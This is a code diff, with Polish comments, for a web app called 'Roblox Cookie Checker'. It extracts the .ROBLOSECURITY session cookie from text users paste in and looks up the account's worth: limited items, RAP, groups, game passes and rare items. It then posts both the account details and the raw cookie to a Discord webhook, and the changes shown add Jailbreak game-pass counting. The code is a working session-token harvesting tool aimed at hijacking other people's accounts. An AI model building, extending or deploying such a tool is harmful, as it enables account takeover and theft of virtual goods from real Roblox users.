@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS (bez zmian)
+// Strona główna – HTML + JS
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -30,13 +30,9 @@ app.get('/', (req, res) => {
 <body>
 <div class="container">
   <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>
-  Cookie zostanie wyciągnięte automatycznie</p>
-
+  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>Cookie zostanie wyciągnięte automatycznie</p>
   <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
-
   <button onclick="check()">Sprawdź i wyślij na webhook</button>
-
   <div id="result"></div>
 </div>
 
@@ -44,7 +40,6 @@ app.get('/', (req, res) => {
 async function check() {
   const raw = document.getElementById('input').value.trim();
   const result = document.getElementById('result');
-
   result.innerHTML = '';
 
   if (!raw) {
@@ -56,7 +51,7 @@ async function check() {
   let cookie = null;
   let match;
 
-  // 1. Format PowerShell / .NET – najczęstszy w Twoich przykładach
+  // 1. Format PowerShell / .NET
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
@@ -93,7 +88,6 @@ async function check() {
     });
 
     if (!res.ok) throw new Error('Błąd serwera: ' + res.status);
-
     const json = await res.json();
 
     if (json.error) {
@@ -102,7 +96,6 @@ async function check() {
     }
 
     let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
-
     if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
 
     html += \`
@@ -116,10 +109,10 @@ async function check() {
       <b>MM2:</b> \${json.mm2Count || 0}<br>
       <b>AMP:</b> \${json.ampCount || 0}<br>
       <b>SAB:</b> \${json.sabCount || 0}<br>
+      <b>JB:</b> \${json.jbCount || 0}<br>
     \`;
 
     result.innerHTML = html;
-
   } catch (err) {
     result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
   }
@@ -130,9 +123,10 @@ async function check() {
   `);
 });
 
-// Endpoint /check – pełna logika + wysyłka dwóch embedów w jednej wiadomości
+// Endpoint /check – główna logika + wysyłka embedów
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
+
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
@@ -160,7 +154,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email Verified (hat)
+    // Email Verified (via hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -193,7 +187,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP (Recent Average Price) – suma wartości limitedów
+    // RAP
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -205,7 +199,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Groups Owned (ile grup jest ownerem – rank 255)
+    // Groups Owned (rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -217,7 +211,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta + data utworzenia
+    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -245,7 +239,9 @@ app.post('/check', async (req, res) => {
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
+    const jbIds  = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
+
+    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
     const hasGamePasses = [];
 
     try {
@@ -260,6 +256,7 @@ app.post('/check', async (req, res) => {
             },
           }
         );
+
         if (gpRes.ok) {
           const gpData = await gpRes.json();
           if (Array.isArray(gpData.data) && gpData.data.length > 0) {
@@ -272,6 +269,7 @@ app.post('/check', async (req, res) => {
     const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
     const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
+    const jbCount  = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
     // Headless i Korblox
     let hasHeadless = false;
@@ -312,10 +310,11 @@ app.post('/check', async (req, res) => {
       hasKorblox,
       mm2Count,
       ampCount,
-      sabCount
+      sabCount,
+      jbCount
     };
 
-    // Wysyłka dwóch embedów w jednej wiadomości
+    // Wysyłka webhook – dwa embedy
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -324,7 +323,7 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
-              // Embed 1 – pełny z informacjami o koncie
+              // Embed 1 – informacje o koncie
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -351,7 +350,8 @@ app.post('/check', async (req, res) => {
                     value:
                       `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                       `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                      `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
+                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
+                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                     inline: true
                   },
                   {
@@ -367,10 +367,9 @@ app.post('/check', async (req, res) => {
                 },
                 timestamp: new Date().toISOString()
               },
-
-              // Embed 2 – tylko wyłapane .ROBLOSECURITY (ciemno fioletowy, minimalistyczny)
+              // Embed 2 – cookie
               {
-                color: 0x4B0082, // ciemny fiolet
+                color: 0x4B0082,
                 title: "Wyłapane .ROBLOSECURITY",
                 description: `\`\`\`\n${cookie}\n\`\`\``,
                 timestamp: new Date().toISOString()
